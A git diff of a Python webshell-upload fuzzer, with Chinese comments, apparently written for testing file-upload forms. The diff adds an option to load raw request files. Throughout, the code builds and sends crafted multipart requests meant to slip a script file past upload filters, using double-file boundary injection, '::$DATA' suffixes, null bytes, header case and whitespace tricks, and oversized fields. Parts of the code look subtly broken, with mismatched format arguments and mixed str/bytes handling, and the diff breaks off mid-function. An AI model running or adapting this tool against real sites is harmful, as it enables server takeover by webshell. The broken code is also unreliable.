@@ -70,7 +70,7 @@ def get_form_data_post_info(url, cookie):
 
 
 def post_multipart_form_data(packet):
-    if not work_packet:
+    if not use_packet_file:
         if delay:
             import time
             time.sleep(int(delay))
@@ -102,24 +102,20 @@ def post_multipart_form_data(packet):
             import time
             time.sleep(int(delay))
         headers = {}
-        header_list = re.findall(b"([^:\s]+): ([^\r\n]+)((\n)|(\r\n))", work_packet_bytes)
-        for each in header_list:
-            headers[each[0]] = each[1]
-        pdb.set_trace()
-
         code = 0
         html = ''
         return_value = {'code': code, 'html': html}
         header_part = re.search(b"(^[\s\S]+?)(?=\r\n\r\n)", packet).group(1)
         header_list = re.findall(b"(\S+): ([^\r\n]+)", header_part)
         for each in header_list:
-            headers[each[0]] = each[1]
+            if each[0] not in [b'Host', b'Content-Length']:
+                headers[each[0].decode('utf8')] = each[1].decode('utf8')
         data = re.search(b"((\r\n\r\n)|(\n\n))([\s\S]*)", packet).group(4)
         proxy = urllib.request.ProxyHandler({'http': '127.0.0.1:8080'})
         opener = urllib.request.build_opener(proxy)
         urllib.request.install_opener(opener)
         req = urllib.request.Request(
-            url, headers=headers, data=unicode_to_bytes(data))
+            url, headers=headers, data=data)
         with urllib.request.urlopen(req) as response:
             code = response.code
             html = response.read()
@@ -174,62 +170,127 @@ def post_multipart_form_data0(url, cookie, form_data_dict, boundary, form_file_p
     return return_value
 
 
-def get_work_file_info(url, cookie, form_data_dict, boundary, form_file_param_name):
-    file_suffix_list = ['jpg', 'png', 'gif', 'txt', 'xxx']
-    for file_suffix in file_suffix_list:
-        filename = "test.%s" % file_suffix
-        if file_suffix == 'jpg':
-            packet = origin_packet
-            packet = packet.replace(
-                'filename="test.jpeg"', 'filename="%s"' % filename)
-            packet = packet.replace(
-                "Content-Type: image/jpeg", "Content-Type: image/jpeg")
-            packet = packet.replace(jpg_file_content, jpg_file_content)
-            rsp = post_multipart_form_data(packet)
-            if rsp['code'] == 200:
-                return {'file_suffix': 'jpg', 'content_type': 'image/jpeg', 'file_content': jpg_file_content, 'work_packet': packet}
-        elif file_suffix == 'png':
-            packet = origin_packet
-            packet = packet.replace(
-                'filename="test.jpeg"', 'filename="%s"' % filename)
-            packet = packet.replace(
-                'Content-Type: image/jpeg', 'Content-Type: image/png')
-            packet = packet.replace(jpg_file_content, png_file_content)
-            rsp = post_multipart_form_data(packet)
-            if rsp['code'] == 200:
-                return {'file_suffix': 'png', 'content_type': 'image/png', 'file_content': png_file_content, 'work_packet': packet}
-        elif file_suffix == 'gif':
-            packet = origin_packet
-            packet = packet.replace(
-                'filename="test.jpeg"', 'filename="%s"' % filename)
-            packet = packet.replace(
-                'Content-Type: image/jpeg', 'Content-Type: image/gif')
-            packet = packet.replace(jpg_file_content, gif_file_content)
-            rsp = post_multipart_form_data(packet)
-            if rsp['code'] == 200:
-                return {'file_suffix': 'gif', 'content_type': 'image/gif', 'file_content': gif_file_content, 'work_packet': packet}
-        elif file_suffix == 'txt':
-            packet = origin_packet
-            packet = packet.replace(
-                'filename="test.jpeg"', 'filename="%s"' % filename)
-            packet = packet.replace(
-                'Content-Type: image/jpeg', 'Content-Type: text/plain')
-            packet = packet.replace(jpg_file_content, jpg_file_content)
-            rsp = post_multipart_form_data(packet)
-            if rsp['code'] == 200:
-                return {'file_suffix': 'txt', 'content_type': 'text/plain', 'file_content': jpg_file_content, 'work_packet': packet}
-        elif file_suffix == 'xxx':
-            packet = origin_packet
-            packet = packet.replace(
-                'filename="test.jpeg"', 'filename="%s"' % filename)
-            packet = packet.replace(
-                'Content-Type: image/jpeg', 'Content-Type: xxx/xxx')
-            packet = packet.replace(jpg_file_content, jpg_file_content)
-            rsp = post_multipart_form_data(packet)
-            if rsp['code'] == 200:
-                return {'file_suffix': 'xxx', 'content_type': 'xxx/xxx', 'file_content': jpg_file_content, 'work_packet': packet}
-    print("正常上传jpg/gif/png/txt/xxx全部失败,这个url的上传功能可能存在问题...")
-    sys.exit(0)
+# def get_work_file_info(url, cookie, form_data_dict, boundary,
+# form_file_param_name):
+def get_work_file_info(*args):
+    if not use_packet_file:
+        # 用户没有提供`-r`参数
+        file_suffix_list = ['jpg', 'png', 'gif', 'txt', 'xxx']
+        for file_suffix in file_suffix_list:
+            filename = "test.%s" % file_suffix
+            if file_suffix == 'jpg':
+                packet = origin_packet
+                packet = packet.replace(
+                    'filename="test.jpg"', 'filename="%s"' % filename)
+                packet = packet.replace(
+                    "Content-Type: image/jpeg", "Content-Type: image/jpeg")
+                packet = packet.replace(jpg_file_content, jpg_file_content)
+                rsp = post_multipart_form_data(packet)
+                if rsp['code'] == 200:
+                    return {'file_suffix': 'jpg', 'content_type': 'image/jpeg', 'file_content': jpg_file_content, 'work_packet': packet}
+            elif file_suffix == 'png':
+                packet = origin_packet
+                packet = packet.replace(
+                    'filename="test.jpg"', 'filename="%s"' % filename)
+                packet = packet.replace(
+                    'Content-Type: image/jpeg', 'Content-Type: image/png')
+                packet = packet.replace(jpg_file_content, png_file_content)
+                rsp = post_multipart_form_data(packet)
+                if rsp['code'] == 200:
+                    return {'file_suffix': 'png', 'content_type': 'image/png', 'file_content': png_file_content, 'work_packet': packet}
+            elif file_suffix == 'gif':
+                packet = origin_packet
+                packet = packet.replace(
+                    'filename="test.jpg"', 'filename="%s"' % filename)
+                packet = packet.replace(
+                    'Content-Type: image/jpeg', 'Content-Type: image/gif')
+                packet = packet.replace(jpg_file_content, gif_file_content)
+                rsp = post_multipart_form_data(packet)
+                if rsp['code'] == 200:
+                    return {'file_suffix': 'gif', 'content_type': 'image/gif', 'file_content': gif_file_content, 'work_packet': packet}
+            elif file_suffix == 'txt':
+                packet = origin_packet
+                packet = packet.replace(
+                    'filename="test.jpg"', 'filename="%s"' % filename)
+                packet = packet.replace(
+                    'Content-Type: image/jpeg', 'Content-Type: text/plain')
+                packet = packet.replace(jpg_file_content, jpg_file_content)
+                rsp = post_multipart_form_data(packet)
+                if rsp['code'] == 200:
+                    return {'file_suffix': 'txt', 'content_type': 'text/plain', 'file_content': jpg_file_content, 'work_packet': packet}
+            elif file_suffix == 'xxx':
+                packet = origin_packet
+                packet = packet.replace(
+                    'filename="test.jpg"', 'filename="%s"' % filename)
+                packet = packet.replace(
+                    'Content-Type: image/jpeg', 'Content-Type: xxx/xxx')
+                packet = packet.replace(jpg_file_content, jpg_file_content)
+                rsp = post_multipart_form_data(packet)
+                if rsp['code'] == 200:
+                    return {'file_suffix': 'xxx', 'content_type': 'xxx/xxx', 'file_content': jpg_file_content, 'work_packet': packet}
+        print("正常上传jpg/gif/png/txt/xxx全部失败,这个url的上传功能可能存在问题...")
+        sys.exit(0)
+
+    else:
+        # 用户提供了`-r`参数来指定一个上传包文件
+        file_suffix_list = ['jpg', 'png', 'gif', 'txt', 'xxx']
+        for file_suffix in file_suffix_list:
+            filename = unicode_to_bytes("test.%s" % file_suffix)
+            if file_suffix == 'jpg':
+                packet = packet_file_bytes
+                packet = re.sub(b'filename=".+"',
+                                b'filename="%s"' % filename, packet)
+                packet = re.sub(b'Content-Type: \S+(?=\r\n)',
+                                b'Content-Type: image/jpeg', packet)
+                file_content = re.search(
+                    b'Content-Type: \S+\r\n\r\n([\s\S]+)\r\n--%s' % boundary, packet, re.I).group(1)
+                packet = packet.replace(
+                    file_content, unicode_to_bytes(jpg_file_content))
+                rsp = post_multipart_form_data(packet)
+                if rsp['code'] == 200:
+                    return {'file_suffix': b'jpg', 'content_type': b'image/jpeg', 'file_content': unicode_to_bytes(jpg_file_content), 'work_packet': packet}
+            elif file_suffix == 'png':
+                packet = origin_packet
+                packet = packet.replace(
+                    'filename="test.jpg"', 'filename="%s"' % filename)
+                packet = packet.replace(
+                    'Content-Type: image/jpeg', 'Content-Type: image/png')
+                packet = packet.replace(jpg_file_content, png_file_content)
+                rsp = post_multipart_form_data(packet)
+                if rsp['code'] == 200:
+                    return {'file_suffix': b'png', 'content_type': b'image/png', 'file_content': unicode_to_bytes(png_file_content), 'work_packet': packet}
+            elif file_suffix == 'gif':
+                packet = origin_packet
+                packet = packet.replace(
+                    'filename="test.jpg"', 'filename="%s"' % filename)
+                packet = packet.replace(
+                    'Content-Type: image/jpeg', 'Content-Type: image/gif')
+                packet = packet.replace(jpg_file_content, gif_file_content)
+                rsp = post_multipart_form_data(packet)
+                if rsp['code'] == 200:
+                    return {'file_suffix': b'gif', 'content_type': b'image/gif', 'file_content': unicode_to_bytes(gif_file_content), 'work_packet': packet}
+            elif file_suffix == 'txt':
+                packet = origin_packet
+                packet = packet.replace(
+                    'filename="test.jpg"', 'filename="%s"' % filename)
+                packet = packet.replace(
+                    'Content-Type: image/jpeg', 'Content-Type: text/plain')
+                packet = packet.replace(jpg_file_content, jpg_file_content)
+                rsp = post_multipart_form_data(packet)
+                if rsp['code'] == 200:
+                    return {'file_suffix': b'txt', 'content_type': b'text/plain', 'file_content': unicode_to_bytes(jpg_file_content), 'work_packet': packet}
+            elif file_suffix == 'xxx':
+                packet = origin_packet
+                packet = packet.replace(
+                    'filename="test.jpg"', 'filename="%s"' % filename)
+                packet = packet.replace(
+                    'Content-Type: image/jpeg', 'Content-Type: xxx/xxx')
+                packet = packet.replace(jpg_file_content, jpg_file_content)
+                rsp = post_multipart_form_data(packet)
+                if rsp['code'] == 200:
+                    return {'file_suffix': b'xxx', 'content_type': b'xxx/xxx', 'file_content': unicode_to_bytes(jpg_file_content), 'work_packet': packet}
+        print("正常上传jpg/gif/png/txt/xxx全部失败,这个url的上传功能可能存在问题...")
+        sys.exit(0)
 
 
 def check_upload_succeed(packet, rsp, origin_html):
@@ -267,10 +328,8 @@ def fuzz_upload_webshell():
     # cookie = 'security=low; PHPSESSID=cl4u4quib5tebhico07nopn2o0'
     if os.path.exists("result.txt"):
         os.system("rm result.txt")
-    work_file_info = get_work_file_info(
-        url, cookie, form_data_dict, boundary, form_file_param_name)
+    work_file_info = get_work_file_info()
     print(work_file_info)
-    pdb.set_trace()
     # 正常文件和webshell的后缀分别为work_suffix和script_suffix
     work_suffix = work_file_info['file_suffix']
     work_file_content = work_file_info['file_content']
@@ -323,16 +382,16 @@ def fuzz_upload_webshell():
         # 双文件上传时,只修改file_name值的情况下可控的位置为两个文件的后缀与第一个文件的content-type,共4种情况
         {'desc': '双文件上传,前正常文件后webshell,且正常文件的content-type未修改',
             'modify': {'filename': 'test.%s"\r\nContent-Type: %s\r\n\r\n%s\r\n%s\r\nContent-Disposition: form-data; name="%s"; filename="test.%s' % (
-                work_suffix, work_content_type, work_file_content, '--' + boundary, form_file_param_name, script_suffix)}},
+                work_suffix, work_content_type, work_file_content, '--' + (boundary if not use_packet_file else boundary.decode('utf8')), form_file_param_name, script_suffix)}},
         {'desc': '双文件上传,前正常文件后webshell,且正常文件的content-type修改为webshell的content-type',
             'modify': {'filename': 'test.%s"\r\nContent-Type: %s\r\n\r\n%s\r\n%s\r\nContent-Disposition: form-data; name="%s"; filename="test.%s' % (
-                work_suffix, webshell_content_type, work_file_content, '--' + boundary, form_file_param_name, script_suffix)}},
+                work_suffix, webshell_content_type, work_file_content, '--' + (boundary if not use_packet_file else boundary.decode('utf8')), form_file_param_name, script_suffix)}},
         {'desc': '双文件上传,前webshell后正常文件,且webshell的content-type未修改',
             'modify': {'filename': 'test.%s"\r\nContent-Type: %s\r\n\r\n%s\r\n%s\r\nContent-Disposition: form-data; name="%s"; filename="test.%s' % (
-                script_suffix, webshell_content_type, work_file_content, '--' + boundary, form_file_param_name, work_suffix)}},
+                script_suffix, webshell_content_type, work_file_content, '--' + (boundary if not use_packet_file else boundary.decode('utf8')), form_file_param_name, work_suffix)}},
         {'desc': '双文件上传,前webshell后正常文件,且webshell的content-type修改为正常文件的content-type',
             'modify': {'filename': 'test.%s"\r\nContent-Type: %s\r\n\r\n%s\r\n%s\r\nContent-Disposition: form-data; name="%s"; filename="test.%s' % (
-                script_suffix, work_content_type, work_file_content, '--' + boundary, form_file_param_name, work_suffix)}},
+                script_suffix, work_content_type, work_file_content, '--' + (boundary if not use_packet_file else boundary.decode('utf8')), form_file_param_name, work_suffix)}},
         {'desc': '上传后缀为如.php::$DATA的文件', 'modify': {
             'filename': 'test.%s::$DATA' % script_suffix}},
         {'desc': '上传后缀为如.php::$DATA......的文件', 'modify': {
@@ -462,16 +521,16 @@ def fuzz_upload_webshell():
         # 双文件上传时,只修改content-type值的情况下可控的位置为两个文件的content-type,共4种情况
         {'desc': '双文件上传,前正常文件后webshell,且正常文件的content-type未修改,webshell的content-type未修改',
             'modify': {'content_type': '%s\r\n\r\n%s\r\n%s\r\nContent-Disposition: form-data; name="%s"; filename="test.%s"\r\nContent-Type: %s' % (
-                work_content_type, work_file_content, '--' + boundary, form_file_param_name, script_suffix, webshell_content_type)}},
+                work_content_type, work_file_content, '--' + (boundary if not use_packet_file else boundary.decode('utf8')), form_file_param_name, script_suffix, webshell_content_type)}},
         {'desc': '双文件上传,前正常文件后webshell,且正常文件的content-type修改为webshell的content-type,webshell的content-type未修改',
             'modify': {'content_type': '%s\r\n\r\n%s\r\n%s\r\nContent-Disposition: form-data; name="%s"; filename="test.%s"\r\nContent-Type: %s' % (
-                webshell_content_type, work_file_content, '--' + boundary, form_file_param_name, script_suffix, webshell_content_type)}},
+                webshell_content_type, work_file_content, '--' + (boundary if not use_packet_file else boundary.decode('utf8')), form_file_param_name, script_suffix, webshell_content_type)}},
         {'desc': '双文件上传,前正常文件后webshell,且正常文件的content-type未修改,webshell的content-type修改为正常文件的content-type',
             'modify': {'content_type': '%s\r\n\r\n%s\r\n%s\r\nContent-Disposition: form-data; name="%s"; filename="test.%s"\r\nContent-Type: %s' % (
-                work_content_type, work_file_content, '--' + boundary, form_file_param_name, script_suffix, work_content_type)}},
+                work_content_type, work_file_content, '--' + (boundary if not use_packet_file else boundary.decode('utf8')), form_file_param_name, script_suffix, work_content_type)}},
         {'desc': '双文件上传,前正常文件后webshell,且正常文件的content-type修改为webshell的content-type,webshell的content-type修改为正常文件的content-type',
             'modify': {'content_type': '%s\r\n\r\n%s\r\n%s\r\nContent-Disposition: form-data; name="%s"; filename="test.%s"\r\nContent-Type: %s' % (
-                webshell_content_type, work_file_content, '--' + boundary, form_file_param_name, script_suffix, work_content_type)}},
+                webshell_content_type, work_file_content, '--' + (boundary if not use_packet_file else boundary.decode('utf8')), form_file_param_name, script_suffix, work_content_type)}},
         {'desc': 'filename字段放在content-type后面', 'modify': {'content_type':
                                                           work_content_type + '\r\nfilename="test.%s"' % script_suffix}}
     ]
@@ -481,16 +540,19 @@ def fuzz_upload_webshell():
             'content_type': work_content_type + chr(i)}}
         fuzz_content_type.append(item)
 
-    #
-
     # 修改filename
     for filename_item in fuzz_file_name:
         # filename变,其他不变
         # 只修改filename,不修改content-type,content-type为jpg,gif,png,txt,xxx中可以正常上传的一种
         print(filename_item['desc'])
-        filename = filename_item['modify']['filename']
-        packet = re.sub(
-            r'''(?<=filename=")[^\s;]+(?=")''', filename, work_packet)
+        if not use_packet_file:
+            filename = filename_item['modify']['filename']
+            packet = re.sub(
+                r'''(?<=filename=")[^\s;]+(?=")''', filename, work_packet)
+        else:
+            filename = unicode_to_bytes(filename_item['modify']['filename'])
+            packet = re.sub(
+                b'''(?<=filename=")[^\s;]+(?=")''', filename, work_packet)
         rsp = post_multipart_form_data(packet)
         check_upload_succeed(packet, rsp, origin_html)
 
@@ -499,25 +561,47 @@ def fuzz_upload_webshell():
         # content-type和file_content变和文件名后缀变,其他不变
         # 修改content-type,file_content随着content-type而改变
         print(content_type_item['desc'])
-        filename = "test.%s" % script_suffix
-        packet = re.sub(
-            r'''(?<=filename=")[^\s;]+(?=")''', filename, work_packet)
-        content_type = content_type_item['modify']['content_type']
-        if content_type in ['image/jpg', 'image/png', 'image/gif', 'text/plain', 'xxx/xxx']:
-            if content_type == 'image/jpg':
-                file_content = jpg_file_content
-            elif content_type == 'image/png':
-                file_content = png_file_content
-            elif content_type == 'image/gif':
-                file_content = gif_file_content
+        if not use_packet_file:
+            filename = "test.%s" % script_suffix
+            packet = re.sub(
+                r'''(?<=filename=")[^\s;]+(?=")''', filename, work_packet)
+            content_type = content_type_item['modify']['content_type']
+            if content_type in ['image/jpg', 'image/png', 'image/gif', 'text/plain', 'xxx/xxx']:
+                if content_type == 'image/jpg':
+                    file_content = jpg_file_content
+                elif content_type == 'image/png':
+                    file_content = png_file_content
+                elif content_type == 'image/gif':
+                    file_content = gif_file_content
+            else:
+                file_content = work_file_info['file_content']
+            packet = re.sub(
+                r"(?<=Content-Type: image/jpeg\r\n\r\n)[\s\S]*(?=\r\n-)", file_content, packet)
+            # 如果content-type中有\x5c,正则替换时要处理下,要不然python会报错
+            content_type = re.sub(r"\x5c", "\\" * 8, content_type)
+            packet = re.sub(r"(?<=Content-Type: )\S+(?=\r\n)",
+                            content_type, packet)
         else:
-            file_content = work_file_info['file_content']
-        packet = re.sub(
-            r"(?<=Content-Type: image/jpeg\r\n\r\n)[\s\S]*(?=\r\n-)", file_content, packet)
-        # 如果content-type中有\x5c,正则替换时要处理下,要不然python会报错
-        content_type = re.sub(r"\x5c", "\\" * 8, content_type)
-        packet = re.sub(r"(?<=Content-Type: )\S+(?=\r\n)",
-                        content_type, packet)
+            filename = "test.%s" % script_suffix
+            packet = re.sub(
+                b'''(?<=filename=")[^\s;]+(?=")''', unicode_to_bytes(filename), work_packet)
+            content_type = unicode_to_bytes(
+                content_type_item['modify']['content_type'])
+            if content_type in [b'image/jpg', b'image/png', b'image/gif', b'text/plain', b'xxx/xxx']:
+                if content_type == b'image/jpg':
+                    file_content = unicode_to_bytes(jpg_file_content)
+                elif content_type == b'image/png':
+                    file_content = unicode_to_bytes(png_file_content)
+                elif content_type == b'image/gif':
+                    file_content = unicode_to_bytes(gif_file_content)
+            else:
+                file_content = work_file_info['file_content']
+            packet = re.sub(
+                b"(?<=Content-Type: image/jpeg\r\n\r\n)[\s\S]*(?=\r\n-)", file_content, packet)
+            # 如果content-type中有\x5c,正则替换时要处理下,要不然python会报错
+            content_type = re.sub(b"\x5c", b"\\" * 8, content_type)
+            packet = re.sub(b"(?<=Content-Type: )\S+(?=\r\n)",
+                            content_type, packet)
         rsp = post_multipart_form_data(packet)
         check_upload_succeed(packet, rsp, origin_html)
 
@@ -548,194 +632,302 @@ def fuzz_upload_webshell():
     ]
     for boundary_item in fuzz_boundary:
         print(boundary_item['desc'])
-        origin_line = 'Content-Type: multipart/form-data; boundary=%s' % boundary
-        new_line = 'Content-Type: multipart/form-data; boundary=%s' % boundary_item['modify']['boundary']
-        packet = work_packet.replace(origin_line, new_line)
-        packet = packet.replace('filename="test.jpg"',
-                                'filename="test.%s"' % script_suffix)
+        if not use_packet_file:
+            origin_line = 'Content-Type: multipart/form-data; boundary=%s' % boundary
+            new_line = 'Content-Type: multipart/form-data; boundary=%s' % boundary_item['modify']['boundary']
+            packet = work_packet.replace(origin_line, new_line)
+            packet = packet.replace('filename="test.jpg"',
+                                    'filename="test.%s"' % script_suffix)
+        else:
+            origin_line = b'Content-Type: multipart/form-data; boundary=%s' % boundary
+            new_line = b'Content-Type: multipart/form-data; boundary=%s' % boundary_item['modify']['boundary']
+            packet = work_packet.replace(origin_line, new_line)
+            packet = packet.replace(
+                b'filename="test.jpg"', b'filename="test.%s"' % unicode_to_bytes(script_suffix))
         rsp = post_multipart_form_data(packet)
         check_upload_succeed(packet, rsp, origin_html)
 
     # 修改Content-Disposition中的name字段值使filename字段前有超长内容,并修改后缀为webshell后缀
-    origin_line = 'Content-Disposition: form-data; name="%s"; filename="test.jpg"' % form_file_param_name
     name_item = {'desc': '修改Content-Disposition中的name字段的值,在name后面加超长字符,如Content-Disposition: form-data; name="uploaded"dddddd(超长d)dddd; filename="test.php"', 'modify': {
         'name': 'Content-Disposition: form-data; name="%s"%s; filename="test.%s"' % (form_file_param_name, 'd' * 2000, script_suffix)}}
-    packet = work_packet.replace(origin_line, name_item['modify']['name'])
+    if not use_packet_file:
+        origin_line = 'Content-Disposition: form-data; name="%s"; filename="test.jpg"' % form_file_param_name
+        packet = work_packet.replace(origin_line, name_item['modify']['name'])
+    else:
+        origin_line = b'Content-Disposition: form-data; name="%s"; filename="test.jpg"' % form_file_param_name
+        packet = work_packet.replace(
+            origin_line, unicode_to_bytes(name_item['modify']['name']))
     print(name_item['desc'])
     rsp = post_multipart_form_data(packet)
     check_upload_succeed(packet, rsp, origin_html)
 
     # 修改Content-Disposition中的name部分形如name=\n"file",并修改后缀为webshell后缀
-    origin_line = 'Content-Disposition: form-data; name="%s"; filename="test.jpg"' % form_file_param_name
     name_item = {'desc': '修改Content-Disposition中的name部分形如name=\n"%s",并修改后缀为webshell后缀' % (form_file_param_name, script_suffix), 'modify': {
         'name': 'Content-Disposition: form-data; name=\n"%s"; filename="test.%s"' % (form_file_param_name, script_suffix)}}
-    packet = work_packet.replace(origin_line, name_item['modify']['name'])
+    if not use_packet_file:
+        origin_line = 'Content-Disposition: form-data; name="%s"; filename="test.jpg"' % form_file_param_name
+        packet = work_packet.replace(origin_line, name_item['modify']['name'])
+    else:
+        origin_line = b'Content-Disposition: form-data; name="%s"; filename="test.jpg"' % form_file_param_name
+        packet = work_packet.replace(
+            origin_line, unicode_to_bytes(name_item['modify']['name']))
     print(name_item['desc'])
     rsp = post_multipart_form_data(packet)
     check_upload_succeed(packet, rsp, origin_html)
 
     # 修改Content-Disposition中的name部分形如nAme="file",并修改后缀为webshell后缀
-    origin_line = 'Content-Disposition: form-data; name="%s"; filename="test.jpg"' % form_file_param_name
-    new_line = 'Content-Disposition: form-data; nAme="%s"; filename="test.%s"' % (
-        form_file_param_name, script_suffix)
-    print('修改Content-Disposition中的name部分形如nAme="%s",并修改后缀为webshell后缀' %
-          form_file_param_name)
+    if not use_packet_file:
+        new_line = 'Content-Disposition: form-data; nAme="%s"; filename="test.%s"' % (
+            form_file_param_name, script_suffix)
+        origin_line = 'Content-Disposition: form-data; name="%s"; filename="test.jpg"' % form_file_param_name
+    else:
+        new_line = b'Content-Disposition: form-data; nAme="%s"; filename="test.%s"' % (
+            form_file_param_name, script_suffix)
+        origin_line = b'Content-Disposition: form-data; name="%s"; filename="test.jpg"' % form_file_param_name
     packet = work_packet.replace(origin_line, new_line)
+    print('修改Content-Disposition中的name部分形如nAme="%s",并修改后缀为webshell后缀' %
+          form_file_param_name.decode('utf8'))
     rsp = post_multipart_form_data(packet)
     check_upload_succeed(packet, rsp, origin_html)
 
     # 修改Content-Disposition为:content-disposition:\n,并修改后缀为webshell后缀
-    origin_line = 'Content-Disposition: form-data; name="%s"; filename="test.jpg"' % form_file_param_name
-    new_line = 'Content-Disposition\n: form-data; name="%s"; filename="test.%s"' % (
-        form_file_param_name, script_suffix)
-    print("修改Content-Disposition为:content-disposition:\n,并修改后缀为webshell后缀")
+    if not use_packet_file:
+        origin_line = 'Content-Disposition: form-data; name="%s"; filename="test.jpg"' % form_file_param_name
+        new_line = 'Content-Disposition\n: form-data; name="%s"; filename="test.%s"' % (
+            form_file_param_name, script_suffix)
+    else:
+        origin_line = b'Content-Disposition: form-data; name="%s"; filename="test.jpg"' % form_file_param_name
+        new_line = b'Content-Disposition\n: form-data; name="%s"; filename="test.%s"' % (
+            form_file_param_name, script_suffix)
     packet = work_packet.replace(origin_line, new_line)
+    print("修改Content-Disposition为:content-disposition:\n,并修改后缀为webshell后缀")
     rsp = post_multipart_form_data(packet)
     check_upload_succeed(packet, rsp, origin_html)
 
     # 删除Content-Disposition字段里的空格,并修改后缀为webshell后缀
-    origin_line = 'Content-Disposition: form-data; name="%s"; filename="test.jpg"' % form_file_param_name
-    new_line = 'Content-Disposition:form-data; name="%s"; filename="test.%s"' % (
-        form_file_param_name, script_suffix)
-    print("删除Content-Disposition字段里的空格,并修改后缀为webshell后缀")
+    if not use_packet_file:
+        origin_line = 'Content-Disposition: form-data; name="%s"; filename="test.jpg"' % form_file_param_name
+        new_line = 'Content-Disposition:form-data; name="%s"; filename="test.%s"' % (
+            form_file_param_name, script_suffix)
+    else:
+        origin_line = b'Content-Disposition: form-data; name="%s"; filename="test.jpg"' % form_file_param_name
+        new_line = b'Content-Disposition:form-data; name="%s"; filename="test.%s"' % (
+            form_file_param_name, script_suffix)
     packet = work_packet.replace(origin_line, new_line)
+    print("删除Content-Disposition字段里的空格,并修改后缀为webshell后缀")
     rsp = post_multipart_form_data(packet)
     check_upload_succeed(packet, rsp, origin_html)
 
     # 去掉content-disposition的form-data字段,并修改后缀为webshell后缀
-    origin_line = 'Content-Disposition: form-data; name="%s"; filename="test.jpg"' % form_file_param_name
-    new_line = 'Content-Disposition: name="%s"; filename="test.%s"' % (
-        form_file_param_name, script_suffix)
-    print("去掉content-disposition的form-data字段,并修改后缀为webshell后缀")
+    if not use_packet_file:
+        origin_line = 'Content-Disposition: form-data; name="%s"; filename="test.jpg"' % form_file_param_name
+        new_line = 'Content-Disposition: name="%s"; filename="test.%s"' % (
+            form_file_param_name, script_suffix)
+    else:
+        origin_line = b'Content-Disposition: form-data; name="%s"; filename="test.jpg"' % form_file_param_name
+        new_line = b'Content-Disposition: name="%s"; filename="test.%s"' % (
+            form_file_param_name, script_suffix)
     packet = work_packet.replace(origin_line, new_line)
+    print("去掉content-disposition的form-data字段,并修改后缀为webshell后缀")
     rsp = post_multipart_form_data(packet)
     check_upload_succeed(packet, rsp, origin_html)
 
     # 删掉"content-disposition: form-data;"并修改后缀为webshell后缀
-    origin_line = 'Content-Disposition: form-data; name="%s"; filename="test.jpg"' % form_file_param_name
-    new_line = ' name="%s"; filename="test.%s"' % (
-        form_file_param_name, script_suffix)
-    print('删掉"content-disposition: form-data;"并修改后缀为webshell后缀')
+    if not use_packet_file:
+        origin_line = 'Content-Disposition: form-data; name="%s"; filename="test.jpg"' % form_file_param_name
+        new_line = ' name="%s"; filename="test.%s"' % (
+            form_file_param_name, script_suffix)
+    else:
+        origin_line = b'Content-Disposition: form-data; name="%s"; filename="test.jpg"' % form_file_param_name
+        new_line = b' name="%s"; filename="test.%s"' % (
+            form_file_param_name, script_suffix)
     packet = work_packet.replace(origin_line, new_line)
+    print('删掉"content-disposition: form-data;"并修改后缀为webshell后缀')
     rsp = post_multipart_form_data(packet)
     check_upload_succeed(packet, rsp, origin_html)
 
     # 修改为"content-disposition\00:",并修改后缀为webshell后缀
-    origin_line = 'Content-Disposition: form-data; name="%s"; filename="test.jpg"' % form_file_param_name
-    new_line = 'Content-Disposition\x00: name="%s"; filename="test.%s"' % (
-        form_file_param_name, script_suffix)
-    print('修改为"content-disposition\00:",并修改后缀为webshell后缀')
+    if not use_packet_file:
+        origin_line = 'Content-Disposition: form-data; name="%s"; filename="test.jpg"' % form_file_param_name
+        new_line = 'Content-Disposition\x00: name="%s"; filename="test.%s"' % (
+            form_file_param_name, script_suffix)
+    else:
+        origin_line = b'Content-Disposition: form-data; name="%s"; filename="test.jpg"' % form_file_param_name
+        new_line = b'Content-Disposition\x00: name="%s"; filename="test.%s"' % (
+            form_file_param_name, script_suffix)
     packet = work_packet.replace(origin_line, new_line)
+    print('修改为"content-disposition\00:",并修改后缀为webshell后缀')
     rsp = post_multipart_form_data(packet)
     check_upload_succeed(packet, rsp, origin_html)
 
     # {char}+content-disposition,并修改后缀为webshell后缀
-    origin_line = 'Content-Disposition: form-data; name="%s"; filename="test.jpg"' % form_file_param_name
-    new_line = 'aContent-Disposition: name="%s"; filename="test.%s"' % (
-        form_file_param_name, script_suffix)
-    print('{char}+content-disposition,并修改后缀为webshell后缀')
+    if not use_packet_file:
+        origin_line = 'Content-Disposition: form-data; name="%s"; filename="test.jpg"' % form_file_param_name
+        new_line = 'aContent-Disposition: name="%s"; filename="test.%s"' % (
+            form_file_param_name, script_suffix)
+    else:
+        origin_line = b'Content-Disposition: form-data; name="%s"; filename="test.jpg"' % form_file_param_name
+        new_line = b'aContent-Disposition: name="%s"; filename="test.%s"' % (
+            form_file_param_name, script_suffix)
     packet = work_packet.replace(origin_line, new_line)
+    print('{char}+content-disposition,并修改后缀为webshell后缀')
     rsp = post_multipart_form_data(packet)
     check_upload_succeed(packet, rsp, origin_html)
 
     # head头的content-type: tab,并修改后缀为webshell后缀
-    origin_line = 'Content-Type: multipart/form-data; boundary=%s' % boundary
-    new_line = 'Content-Type: \x09multipart/form-data; boundary=%s' % boundary
+    if not use_packet_file:
+        origin_line = 'Content-Type: multipart/form-data; boundary=%s' % boundary
+        new_line = 'Content-Type: \x09multipart/form-data; boundary=%s' % boundary
+        packet = work_packet.replace(origin_line, new_line)
+        packet = re.sub(r'filename="test.jpg"', 'filename="test.%s"' %
+                        script_suffix, packet)
+    else:
+        origin_line = b'Content-Type: multipart/form-data; boundary=%s' % boundary
+        new_line = b'Content-Type: \x09multipart/form-data; boundary=%s' % boundary
+        packet = work_packet.replace(origin_line, new_line)
+        packet = re.sub(b'filename="test.jpg"', b'filename="test.%s"' %
+                        script_suffix, packet)
     print('head头的content-type: tab,并修改后缀为webshell后缀')
-    packet = work_packet.replace(origin_line, new_line)
-    packet = re.sub(r'filename="test.jpg"', 'filename="test.%s"' %
-                    script_suffix, packet)
     rsp = post_multipart_form_data(packet)
     check_upload_succeed(packet, rsp, origin_html)
 
     # head头的content-type: multipart/form-DATA,并修改后缀为webshell后缀
-    origin_line = 'Content-Type: multipart/form-data;'
-    new_line = 'Content-Type: multipart/form-DATA;'
+    if not use_packet_file:
+        origin_line = 'Content-Type: multipart/form-data;'
+        new_line = 'Content-Type: multipart/form-DATA;'
+        packet = work_packet.replace(origin_line, new_line)
+        packet = re.sub(r'filename="test.jpg"', 'filename="test.%s"' %
+                        script_suffix, packet)
+    else:
+        origin_line = b'Content-Type: multipart/form-data;'
+        new_line = b'Content-Type: multipart/form-DATA;'
